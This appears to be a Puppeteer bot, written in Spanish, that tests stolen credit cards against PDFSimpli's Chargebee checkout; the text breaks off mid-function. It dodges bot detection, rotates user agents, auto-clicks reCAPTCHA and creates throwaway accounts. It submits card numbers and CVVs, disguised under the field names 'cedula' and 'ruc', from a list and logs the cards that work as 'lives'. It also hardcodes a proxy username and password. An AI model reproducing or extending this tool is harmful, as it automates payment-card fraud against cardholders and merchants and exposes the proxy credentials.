// ======================================================
//  ⚡ CYBER NEON THEME — BY McMetric & Anthony98
// ======================================================
const COLORS_NEON = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    neonCyan: "\x1b[96m",
    neonMagenta: "\x1b[95m",
    neonBlue: "\x1b[94m",
    neonPurple: "\x1b[35m",
    neonPink: "\x1b[91m",
    neonGreen: "\x1b[92m",
    neonYellow: "\x1b[93m",
};

// Guardamos logs originales
const _log = console.log;
const _warn = console.warn;
const _error = console.error;

console.log = (...msg) => {
    _log(COLORS_NEON.neonCyan + COLORS_NEON.bright + "▶ " + msg.join(" ") + COLORS_NEON.reset);
};
console.warn = (...msg) => {
    _warn(COLORS_NEON.neonYellow + COLORS_NEON.bright + "⚠ " + msg.join(" ") + COLORS_NEON.reset);
};
console.error = (...msg) => {
    _error(COLORS_NEON.neonPink + COLORS_NEON.bright + "✖ ERROR: " + msg.join(" ") + COLORS_NEON.reset);
};

// ======================================================
// 🟣 BANNER PRINCIPAL
// ======================================================

console.log(
    COLORS_NEON.neonMagenta + COLORS_NEON.bright +
`
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██████╗  ██████╗ ████████╗     ██╗   ██╗███████╗██████╗ ███████╗  ║
║    ██╔══██╗██╔═══██╗╚══██╔══╝     ██║   ██║██╔════╝██╔══██╗██╔════╝  ║
║    ██║  ██║██║   ██║   ██║   ███████║   ██║█████╗  ██████╔╝█████╗    ║
║    ██║  ██║██║   ██║   ██║   ██╔══██║   ██║██╔══╝  ██╔══██╗██╔══╝    ║
║    ██████╔╝╚██████╔╝   ██║   ██║  ██║██╗██║███████╗██║  ██║███████╗  ║
║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
║                                                                      ║
║           🟣 BOT LÁZARO — CYBER NEON MODE ACTIVATED                  ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
`
+ COLORS_NEON.reset
);

// ======================================================
// 🔧 DEPENDENCIAS
// ======================================================
const puppeteer = require("puppeteer-core");
const fs = require("fs").promises;
const path = require("path");
const { execSync } = require("child_process");

// ======================================================
// 🎭 USER-AGENT ROTATOR — REALISTA & ANTI-DETECT
// ======================================================
const USER_AGENTS = [
    // Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.60 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Safari/537.36",
    // Android Chrome
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.47 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.180 Mobile Safari/537.36",
    // Edge camuflado
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2124.7"
];

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// ======================================================
// 🔥 CAPTCHA SOLVER ULTRA ESTABLE
// ======================================================

class CaptchaSolver {
    constructor(page, log = console.log) {
        this.page = page;
        this.log = log;
    }

    delay(ms) { return new Promise(r => setTimeout(r, ms)); }

    async solve() {
        try {
            await this.log("🔍 Buscando CAPTCHA (modo estable real)...");

            let anchor = null;
            let frameFound = null;

            // 120 intentos → recaptcha real
            for (let i = 0; i < 120; i++) {

                for (const f of this.page.frames()) {
                    try {
                        const candidate = await f.$("#recaptcha-anchor");
                        if (candidate) {
                            anchor = candidate;
                            frameFound = f;
                            break;
                        }
                    } catch (_) {}
                }

                if (!anchor) {
                    if (i % 20 === 0)
                        await this.log(`⏳ CAPTCHA aún no aparece... (${i}/120)`);
                    await this.delay(250);
                    continue;
                }

                // Confirmar visibilidad
                const isHidden = await frameFound.evaluate(() => {
                    const el = document.querySelector("#recaptcha-anchor");
                    return el && el.getAttribute("aria-hidden") === "true";
                }).catch(() => false);

                if (isHidden) {
                    await this.delay(200);
                    continue;
                }

                const box = await anchor.boundingBox().catch(() => null);

                if (!box || box.width === 0 || box.height === 0) {
                    await this.delay(200);
                    continue;
                }

                break;
            }

            if (!anchor) {
                await this.log("⏩ No hay CAPTCHA, continuando...");
                return true;
            }

            await this.log("🟢 CAPTCHA listo — resolviendo...");

            const box = await anchor.boundingBox();

            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(80);
            await this.page.mouse.up();

            for (let i = 0; i < 40; i++) {
                const ok = await frameFound.evaluate(() => {
                    const el = document.querySelector("#recaptcha-anchor");
                    return el && el.getAttribute("aria-checked") === "true";
                }).catch(() => false);

                if (ok) {
                    await this.log("🟣 CAPTCHA COMPLETAMENTE RESUELTO ✔✔✔");
                    return true;
                }

                await this.delay(300);
            }

            await this.log("⚠ CAPTCHA no marcó como resuelto, continuando...");
            return true;

        } catch (e) {
            await this.log("❌ Error CAPTCHA: " + e.message);
            return true;
        }
    }
}

// ======================================================
// 🧠 KATY20 — MOTOR PRINCIPAL DEL BOT
// ======================================================

class PDFSimpliBot {
    constructor() {
        this.baseDir = "/home/faelo/botdata";
        this.logFile = path.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = path.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = path.join(this.baseDir, "lives.txt");

        this.CHROMIUM_PATHS = [
            "/usr/bin/google-chrome",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/snap/bin/chromium",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
        ];

        this.browser = null;
        this.page = null;

        this.tarjetas = [];
        this.tarjetaIndex = 0;

        this.cuentasProcesadas = 0;
        this.cardsThisAccount = 0;
    }
    delay(ms) {
        return new Promise(res => setTimeout(res, ms));
    }

    async log(msg) {
        console.log(msg);
        await fs.appendFile(this.logFile, `[${new Date().toISOString()}] ${msg}\n`);
    }

    async ensureDir(d) {
        try {
            await fs.mkdir(d, { recursive: true });
        } catch (_) {}
    }

    async limpiarChromeTresVeces() {
        for (let i = 1; i <= 3; i++) {
            await this.log(`🧹 Limpieza Chrome ${i}/3 antes de nueva cuenta`);
            try {
                execSync("bash /home/faelo/limpiar_chrome.sh", {
                    stdio: "inherit"
                });
            } catch (e) {
                await this.log("⚠️ Error limpiando Chrome: " + e.message);
            }
            await this.delay(800);
        }
    }

    async limpiarNavegador() {
        await this.limpiarChromeTresVeces();
    }

    async findChromium() {
        for (const p of this.CHROMIUM_PATHS) {
            try {
                await fs.access(p);
                return p;
            } catch (_) {}
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async deepFind(selector) {
        let el = await this.page.$(selector);
        if (el) return el;

        for (const f of this.page.frames()) {
            try {
                el = await f.$(selector);
                if (el) return el;
            } catch (_) {}
        }
        return null;
    }

    // =============================================================
    // ULTRACLICK (RETORNA CLICK REAL AUN EN PÁGINAS CAMBIANTES)
    // =============================================================
    async ultraClick(selector) {
        for (let i = 0; i < 5; i++) {
            const el = await this.deepFind(selector);
            if (el) {
                try {
                    const box = await el.boundingBox();
                    if (box) {
                        await this.page.mouse.move(
                            box.x + box.width / 2,
                            box.y + box.height / 2
                        );
                        await this.delay(80);
                        await this.page.mouse.down();
                        await this.delay(60);
                        await this.page.mouse.up();
                        return true;
                    } else {
                        await el.click();
                        return true;
                    }
                } catch (_) {}
            }
            await this.delay(350);
        }
        return false;
    }

    // =============================================================
    // DETECCIÓN DEL IFRAME DE TARJETA (ChargeBee)
    // =============================================================
    async waitForCardIframeStable() {
        for (let i = 0; i < 40; i++) {
            const frames = this.page.frames();
            const target = frames.find(f =>
                f.url().includes("chargebee") ||
                f.url().includes("billing") ||
                f.url().includes("js/iframe") ||
                f.url().match(/checkout|card|payment/i)
            );

            if (target) return target;

            await this.delay(300);
        }

        throw new Error("❌ No se pudo detectar el iframe de tarjeta (Chargebee)");
    }

    // =============================================================
    // INICIALIZACIÓN DEL BROWSER (PROXY + USER AGENT + ANTI-DETECT)
    // =============================================================
    async initialize() {

        await this.ensureDir(this.baseDir);
        await this.ensureDir(path.join(this.baseDir, "documents"));
        await this.ensureDir(path.join(this.baseDir, "downloads"));

        const chromium = await this.findChromium();

        // UA ALEATORIO REALISTA
        const USER_AGENT = getRandomUserAgent();

        this.browser = await puppeteer.launch({
            executablePath: chromium,
            headless: false,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                "--incognito",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-infobars",
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--start-maximized",
                "--window-size=1920,1080",
                "--disable-blink-features=AutomationControlled",
                "--proxy-server=http://dc.oxylabs.io:8000"
            ]
        });

        this.page = await this.browser.newPage();

        // AUTENTICAR PROXY
        await this.page.authenticate({
            username: "user-zabuza_Z60hQ",
            password: "Tuning_9718ZZ"
        });

        // SET USER AGENT
        await this.page.setUserAgent(USER_AGENT);

        // ANTI-DETECT webdriver
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
        });

        await this.log("🚀 Chrome inicializado con Oxylabs y User-Agent rotatorio");
    }
    // =============================================================
    // TARJETAS
    // =============================================================
    async loadAllTarjetas() {
        const raw = await fs.readFile(path.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = raw
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean)
            .map(line => {
                const [cedula, mes, anio, ruc] = line.split("|");
                return { cedula, mes, anio, ruc };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    getNextTarjeta() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const t = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return t;
    }

    async guardarCedulaValida(t) {
        const line = `${t.cedula}|${t.mes}|${t.anio}|${t.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await fs.appendFile(this.livesFile, line);
        await this.log(`💾 LIVE GUARDADA: ${t.cedula}`);
    }

    async eliminarTarjetaDelArchivo(tarjeta) {
        try {
            const file = path.join(this.baseDir, "tarjetas.txt");
            const raw = await fs.readFile(file, "utf8");

            const lineToRemove = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}`;

            const newData = raw
                .split(/\r?\n/)
                .filter(l => l.trim() && l.trim() !== lineToRemove)
                .join("\n");

            await fs.writeFile(file, newData);
            await this.log(`🗑️ Tarjeta eliminada del archivo: ${lineToRemove}`);

        } catch (e) {
            await this.log("⚠️ Error eliminando tarjeta del archivo: " + e.message);
        }
    }

    async guardarTarjetaEnArchivo(tarjeta, esValida) {
        try {
            const file = path.join(
                this.baseDir,
                esValida ? "validas.txt" : "invalidas.txt"
            );

            const line = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}|${
                esValida ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await fs.appendFile(file, line);

            await this.log(
                `📦 Tarjeta movida a ${esValida ? "validas.txt" : "invalidas.txt"}: ${
                    tarjeta.cedula
                }`
            );

        } catch (e) {
            await this.log("⚠️ Error guardando tarjeta en archivo: " + e.message);
        }
    }

    // =============================================================
    // SUBIR PDF ULTRA ESTABLE
    // =============================================================
    async uploadPDF() {
        await this.log("📄 Buscando input file (modo estable)...");

        let input = null;

        for (let i = 0; i < 50; i++) {
            input = await this.deepFind('input[type="file"]');
            if (input) {
                const disabled = await input.evaluate(el => el.disabled);
                if (!disabled) break;
            }
            if (i % 10 === 0)
                await this.log(`⏳ Esperando input real... (${i}/50)`);
            await this.delay(200);
        }

        if (!input) throw new Error("❌ Input file no encontrado después de 50 intentos");

        const docs = path.join(this.baseDir, "documents");
        const files = await fs.readdir(docs);
        const pdf = files.find(f => f.endsWith(".pdf"));
        if (!pdf) throw new Error("❌ No hay PDF en carpeta documents");

        const pdfPath = path.join(docs, pdf);
        await this.log(`📁 Subiendo PDF: ${pdfPath}`);

        let uploadSuccess = false;

        for (let intento = 1; intento <= 5; intento++) {
            try {
                const [nav] = await Promise.all([
                    this.page.waitForNavigation({
                        waitUntil: "networkidle2",
                        timeout: 15000
                    }).catch(() => null),
                    input.uploadFile(pdfPath)
                ]);

                uploadSuccess = true;
                break;

            } catch (err) {
                await this.log(`⚠️ Intento ${intento}/5 fallido al subir PDF`);
                await this.delay(500);
            }
        }

        if (!uploadSuccess) throw new Error("❌ Falló la subida del PDF después de 5 intentos");

        await this.log("⏳ Esperando a que la página termine de procesar...");
        await this.delay(3000);

        for (let i = 0; i < 30; i++) {
            const content = await this.page.content().catch(() => "");
            if (!content.includes("loading") && !content.includes("spinner"))
                break;

            await this.delay(300);
        }

        await this.log("🟢 PDF subido y procesado correctamente (modo navegación estable)");
    }

    // =============================================================
    // GET STARTED
    // =============================================================
    async clickLetsGetStarted() {
        await this.log("🔍 Buscando GET STARTED (modo estable)...");

        let btn = null;

        for (let i = 0; i < 120; i++) {
            try {
                btn =
                    await this.deepFind('#preEditPop') ||
                    await this.deepFind("button[id*='start' i]") ||
                    await this.deepFind("button[class*='start' i]") ||
                    await this.deepFind("a[id*='start' i]") ||
                    await this.deepFind("div[id*='start' i]");

                if (btn) {
                    const box = await btn.boundingBox().catch(() => null);
                    if (box && box.width > 0 && box.height > 0) break;
                }

            } catch (e) {
                if (e.message.includes("Execution context was destroyed")) {
                    await this.log("⚠️ Página recargó durante GET STARTED — reintentando...");
                }
            }

            await this.delay(300);
        }

        if (!btn)
            throw new Error("❌ GET STARTED nunca apareció (modo estable)");

        try {
            await this.page.evaluate(el =>
                el.scrollIntoView({ behavior: "instant", block: "center" })
            , btn);
        } catch (_) {}

        await this.delay(100);

        const box = await btn.boundingBox().catch(() => null);
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(70);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click().catch(() => {});
        }

        await this.log("🟢 GET STARTED presionado correctamente (modo estable)");
        await this.delay(3000);
    }

    // =============================================================
    // CONVERT
    // =============================================================
    async clickConvert() {
        await this.log("⏳ Esperando 20 segundos antes de buscar Convert...");
        await this.delay(20000);

        await this.log("⚙️ Buscando botón Convert...");

        let btn = null;

        for (let i = 0; i < 40; i++) {
            btn =
                await this.deepFind("#ConvertContinue") ||
                await this.deepFind("button[data-test='convert']") ||
                await this.deepFind(".button-convert") ||
                await this.deepFind("button[id*='convert' i]") ||
                await this.deepFind("a[id*='convert' i]") ||
                await this.deepFind("div[id*='convert' i]");

            if (btn) break;

            if (i % 10 === 0)
                await this.log(`⏳ Aún no aparece Convert... (${i}/40)`);

            await this.delay(300);
        }

        if (!btn)
            throw new Error("❌ Convert no apareció después de 20s + 40 intentos");

        try {
            await this.page.evaluate(el =>
                el.scrollIntoView({ behavior: "instant", block: "center" })
            , btn);
        } catch (_) {}

        const box = await btn.boundingBox();

        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(70);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.log("🟢 Convert detectado y presionado correctamente");
        await this.delay(4000);
    }

    // =============================================================
    // DOWNLOAD
    // =============================================================
    async clickDownload() {
        await this.log("⬇️ Detectando botón DOWNLOAD...");

        let btn = null;

        for (let i = 0; i < 40; i++) {
            try {
                btn =
                    await this.deepFind("#congDwnaut") ||
                    await this.deepFind("button[id*='download' i]") ||
                    await this.deepFind("a[id*='download' i]") ||
                    await this.deepFind("div[id*='download' i]");

                if (!btn) continue;

                const box = await btn.boundingBox();
                if (box) break;

            } catch (e) {
                if (e.message.includes("Execution context was destroyed")) {
                    await this.log("⚠️ Página recargó durante DOWNLOAD — reintentando...");
                    await this.delay(300);
                    continue;
                }
            }

            if (i % 10 === 0)
                await this.log(`⏳ Esperando botón DOWNLOAD... (${i}/40)`);

            await this.delay(350);
        }

        if (!btn) {
            await this.log("⚠️ DOWNLOAD no apareció realmente");
            return false;
        }

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: path.join(this.baseDir, "downloads"),
        });

        try {
            await this.page.evaluate(el =>
                el.scrollIntoView({ behavior: "instant", block: "center" })
            , btn);
        } catch (_) {}

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(
                box.x + box.width / 2,
                box.y + box.height / 2
            );
            await this.delay(70);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.log("📥 DOWNLOAD presionado correctamente");
        await this.delay(4500);
        return true;
    }

    // =============================================================
    // REGISTRO + CAPTCHA
    // =============================================================
    async handleRegistration() {
        await this.log("🧑‍💻 Registro...");

        let emailInput = null;
        let passInput = null;

        for (let i = 0; i < 60; i++) {
            emailInput = await this.deepFind("#email");
            passInput  = await this.deepFind("#password");

            if (emailInput && passInput) break;

            if (i % 15 === 0)
                await this.log(`⏳ Esperando formulario real... (${i}/60)`);

            await this.delay(250);
        }

        if (!emailInput || !passInput) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const email = `user${Date.now()}@gmail.com`;
        const pass  = "P" + Math.random().toString(36).slice(2, 10) + "!";

        await emailInput.click({ clickCount: 3 });
        await emailInput.type(email, { delay: 35 });

        for (let intento = 1; intento <= 10; intento++) {
            passInput = await this.deepFind("#password");
            if (!passInput) {
                await this.log("⚠️ Campo password desapareció — reintentando...");
                await this.delay(300);
                continue;
            }

            await passInput.click({ clickCount: 3 });
            await passInput.type(pass, { delay: 30 });

            await this.delay(350);

            const typed = await passInput.evaluate(el => el.value || "");
            if (typed === pass) {
                await this.log("🟢 Contraseña quedó escrita correctamente (modo estable)");
                break;
            }

            await this.log(`⚠️ Página borró la contraseña → retry (${intento}/10)`);
        }

        await this.log("🔍 Buscando botón SIGN UP...");
        let btn = null;

        for (let i = 0; i < 40; i++) {
            btn = await this.deepFind("#sign-up");
            if (btn) break;
            await this.delay(200);
        }

        if (btn) {
            const box = await btn.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(50);
                await this.page.mouse.down();
                await this.delay(50);
                await this.page.mouse.up();
            } else {
                await btn.click();
            }
        }

        await this.log("⏳ CAPTCHA...");
        await this.delay(4000);

        const solver = new CaptchaSolver(this.page, this.log.bind(this));
        await solver.solve();

        await this.log(`🟢 Cuenta creada: ${email}`);
        await this.delay(1500);
    }
    // =============================================================
    // BOTÓN CONTINUE
    // =============================================================
    async safeFindContinueButton() {
        try {
            for (const f of this.page.frames()) {
                const btn =
                    await f.$("#planPageContinueButton") ||
                    await f.$("button[data-test='continue']") ||
                    await f.$(".continue-button") ||
                    await f.$("button[id*='continue' i]") ||
                    await f.$("a[id*='continue' i]") ||
                    await f.$("div[id*='continue' i]") ||
                    await f.$("button[class*='continue' i]") ||
                    await f.$("a[class*='continue' i]") ||
                    await f.$("div[class*='continue' i]");

                if (btn) return btn;
            }

            const handle = await this.page.evaluateHandle(() => {
                const tags = ["button", "a", "div", "input"];
                for (const t of tags) {
                    for (const el of document.querySelectorAll(t)) {
                        const txt = (el.innerText || el.value || "").toLowerCase();
                        if (txt.includes("continue")) return el;
                    }
                }
                return null;
            });

            if (handle && handle.asElement) return handle.asElement();

            const list = [
                "button[id*='continue' i]",
                "button[class*='continue' i]",
                "button[data-id*='continue' i]",
                "a[class*='continue' i]",
                "a[id*='continue' i]",
                "input[type='button'][value*='continue' i]"
            ];

            for (const s of list) {
                const el = await this.page.$(s);
                if (el) return el;
            }

            return null;

        } catch (e) {
            console.log("❌ safeFindContinueButton:", e);
            return null;
        }
    }

    async waitAndClickContinueToPayment() {
        await this.log("🔍 Buscando botón CONTINUE (plan)...");

        let btn = null;

        for (let i = 0; i < 80; i++) {
            btn = await this.safeFindContinueButton();

            if (btn) {
                try {
                    const box = await btn.boundingBox();
                    if (box && box.width > 0 && box.height > 0) break;
                } catch (_) {}
            }

            if (i % 10 === 0)
                await this.log(`⏳ CONTINUE aún cargando... (${i}/80)`);

            await this.delay(600);
        }

        if (!btn)
            throw new Error("❌ CONTINUE no apareció después de 80 intentos");

        try {
            await this.page.evaluate(el =>
                el.scrollIntoView({ behavior: "instant", block: "center" })
            , btn);
        } catch (_) {}

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(120);
            await this.page.mouse.down();
            await this.delay(80);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.delay(2500);
        await this.log("🟢 CONTINUE detectado y presionado correctamente (80 intentos modo estable)");
    }

    // =============================================================
    // ESPERAR CHECKOUT
    // =============================================================
    async waitForCheckoutPage() {
        await this.log("🔎 Esperando que cargue Checkout...");

        for (let i = 0; i < 40; i++) {
            const url = this.page.url();

            if (url.includes("/checkout")) {
                await this.log("🟢 Checkout detectado");
                return true;
            }

            await this.delay(500);
        }

        throw new Error("❌ Checkout no cargó después de 40 intentos");
    }

    // =============================================================
    // FORMULARIO COMPLETO — VERSIÓN CLÁSICA (FUNCIONAL)
    // =============================================================
    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
        await this.waitForCheckoutPage();

        await this.log("🧾 Llenando formulario COMPLETO (versión clásica estable)...");

        // ===============================
        // NOMBRE TITULAR
        // ===============================
        const nombreField =
            await this.deepFind("#checkout_form_card_name") ||
            await this.deepFind("[name='cardName']");

        if (!nombreField) throw new Error("❌ Campo NOMBRE no encontrado");

        await nombreField.click({ clickCount: 3 });
        await nombreField.type(nombre, { delay: 20 });

        // ===============================
        // MES
        // ===============================
        const mesOk = await this.page.evaluate((mesStr) => {
            const s = document.querySelector("select[name='ccMonthExp'], #expmo");
            if (!s) return false;
            const v = String(parseInt(mesStr, 10));
            if (!v || v === "NaN") return false;

            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );

            return true;
        }, mes);

        if (!mesOk) throw new Error("❌ No se pudo seleccionar el MES");

        await this.delay(1000);

        // ===============================
        // AÑO
        // ===============================
        const anioOk = await this.page.evaluate((anioStr) => {
            const s = document.querySelector("select[name='ccYearExp'], #expyr");
            if (!s) return false;
            const v = String(parseInt(anioStr, 10));
            if (!v || v === "NaN") return false;

            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );

            return true;
        }, anio);

        if (!anioOk) throw new Error("❌ No se pudo seleccionar el AÑO");

        await this.delay(1200);

        // =============================================================
        // 🔥 FIX: CAMPO DE TARJETA — VERSIÓN ANTIGUA (LA QUE SÍ FUNCIONA)
        // =============================================================
        await this.log("🔍 Buscando campo de tarjeta (versión clásica)...");

        let cedulaField = null;

        for (const f of this.page.frames()) {
            try {
                const cand = await f.$("input[name='cardNumber'], input#data, input[autocomplete='cc-number']");

                if (!cand) continue;

                const maxLen = await cand.evaluate(el =>
                    el.getAttribute("maxlength") || ""
                );

                if (maxLen && parseInt(maxLen, 10) >= 16) {
                    cedulaField = cand;
                    break;
                }

            } catch (_) {}
        }

        if (!cedulaField) {
            throw new Error("❌ Campo número de tarjeta NO encontrado (versión clásica)");
        }

        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula, { delay: 15 });

        await this.delay(600);

        // =============================================================
        // RUC / CVV
        // =============================================================
        // ===============================
// RUC / CVV (versión vieja, 100% funcional)
// ===============================
// ===================================
// 🟣 DETECCIÓN UNIVERSAL DE CVV (RUC)
// ===================================
let rucField = null;

// 1) Buscar en todos los iframes (Chargebee separa CVV)
for (const f of this.page.frames()) {
    try {
        const candList = await f.$$("input");

        for (const cand of candList) {
            const type = await cand.evaluate(el => el.getAttribute("type") || "");
            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            const autocomplete = await cand.evaluate(el => el.getAttribute("autocomplete") || "");

            // 🎯 Condiciones posibles de CVV
            if (
                maxLen === "3" ||
                maxLen === "4" ||
                autocomplete === "cc-csc" ||
                type === "tel"
            ) {
                const box = await cand.boundingBox();
                if (box && box.width > 0) {
                    rucField = cand;
                    break;
                }
            }
        }

        if (rucField) break;

    } catch (_) {}
}

// 2) FallBack global — EXACTO como tu bot viejo:
if (!rucField) {
    rucField =
        await this.page.$("input[maxlength='4']") ||
        await this.page.$("input[autocomplete='cc-csc']");
}

if (!rucField)
    throw new Error("❌ No se encontró el campo CVV/RUC (fix universal)");

await rucField.click({ clickCount: 3 });
await rucField.type(ruc, { delay: 20 });

await this.log("🟢 CVV/RUC llenado correctamente (modo universal)");



        // =============================================================
        // CHECKBOX
        // =============================================================
        let checkbox = await this.deepFind("#acceptCheckboxMark");
        if (!checkbox) throw new Error("❌ Checkbox de aceptación no encontrado");

        await this.page.evaluate(el => el.click(), checkbox);

        // =============================================================
        // SUBMIT
        // =============================================================
        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );

        await this.delay(300);

        try {
            const box = await submit.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(70);
                await this.page.mouse.down();
                await this.delay(60);
                await this.page.mouse.up();
            } else {
                await submit.click();
            }
        } catch (_) {
            await submit.click();
        }

        await this.log("🚀 Pago enviado (Formulario Completo — Versión Clásica)");
        await this.delay(1500);
    }
    // =============================================================
    // FLUJO RÁPIDO (solo número de tarjeta + RUC)
    // =============================================================
    async fillCardFast(cedula, ruc) {
        await this.waitForCheckoutPage();

        await this.log("⚡ FLUJO RÁPIDO: solo número + RUC...");

        let cedulaField = null;

        for (let intento = 1; intento <= 3; intento++) {
            const frames = this.page.frames();

            for (const f of frames) {
                try {
                    const cand = await f.$("input[name='cardNumber'], input#data, input[autocomplete='cc-number']");
                    if (!cand) continue;

                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");

                    if (maxLen && parseInt(maxLen, 10) >= 16) {
                        cedulaField = cand;
                        break;
                    }

                } catch (_) {}
            }

            if (cedulaField) break;

            await this.log(`⚠️ No se encontró campo de número (rápido) — reintento ${intento}/3`);
            await this.delay(1500);
        }

        if (!cedulaField)
            throw new Error("❌ No se encontró campo de número (rápido) después de 3 intentos");

        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula);

        // ====== RUC ======
        let rucField = null;

        for (let intento = 1; intento <= 3; intento++) {
            const frames = this.page.frames();

            for (const f of frames) {
                try {
                    const cand =
                        await f.$("input[name='cvv']") ||
                        await f.$("input[maxlength='4']") ||
                        await f.$("input[autocomplete='cc-csc']");

                    if (!cand) continue;

                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");

                    if (maxLen === "4") {
                        rucField = cand;
                        break;
                    }

                } catch (_) {}
            }

            if (rucField) break;

            await this.log(`⚠️ No se encontró campo RUC (rápido) — reintento ${intento}/3`);
            await this.delay(1500);
        }

        if (!rucField)
            throw new Error("❌ No se encontró campo RUC (rápido) después de 3 intentos");

        await rucField.click({ clickCount: 3 });
        await rucField.type(ruc);

        // ====== SUBMIT ======
        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado (rápido)");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );

        await submit.click();

        await this.log("🚀 Pago enviado (FLUJO RÁPIDO)");
        await this.delay(2000);
    }

    // =============================================================
    // CLOSE KILLER — DETECTA Y CIERRA MODALES DE ERROR
    // =============================================================
    async findCloseButton() {
        const frames = [this.page, ...this.page.frames()];

        for (const ctx of frames) {
            try {
                const handle = await ctx.evaluateHandle(() => {
                    const all = [...document.querySelectorAll("button")];
                    return (
                        all.find(b => {
                            const text = (b.innerText || "").trim().toLowerCase();
                            const cls = b.className || "";
                            const tracker = b.getAttribute("data-tracker") === "true";

                            const looksLike =
                                cls.includes("bg-ps-reskin-radial") ||
                                cls.includes("rounded-3xl");

                            return (
                                text.includes("close") &&
                                (tracker || looksLike || text === "close")
                            );
                        }) || null
                    );
                });
                if (handle && handle.asElement()) return handle.asElement();
            } catch (_) {}
        }

        const selectors = [
            "button[data-tracker='true']",
            "button[class*='bg-ps-reskin-radial']",
            "button[class*='rounded-3xl']",
            "button"
        ];

        for (const ctx of frames) {
            for (const sel of selectors) {
                try {
                    const btns = await ctx.$$(sel);
                    for (const b of btns) {
                        const text = (await b.evaluate(el => el.innerText || "")).trim().toLowerCase();
                        if (text.includes("close")) return b;
                    }
                } catch (_) {}
            }
        }

        return null;
    }

    async closeErrorModal() {
        await this.log("🔎 Buscando botón Close...");

        let foundAny = false;

        for (let intento = 0; intento < 12; intento++) {
            const btn = await this.findCloseButton();

            if (!btn) {
                if (!foundAny) {
                    await this.log("🟢 No hay modal de error visible (sin Close)");
                    return false;
                } else {
                    await this.log("🟢 Modal ya cerrado");
                    return true;
                }
            }

            foundAny = true;
            await this.log(`🔴 Close detectado → click intento ${intento + 1}`);

            try {
                await this.page.evaluate(el => {
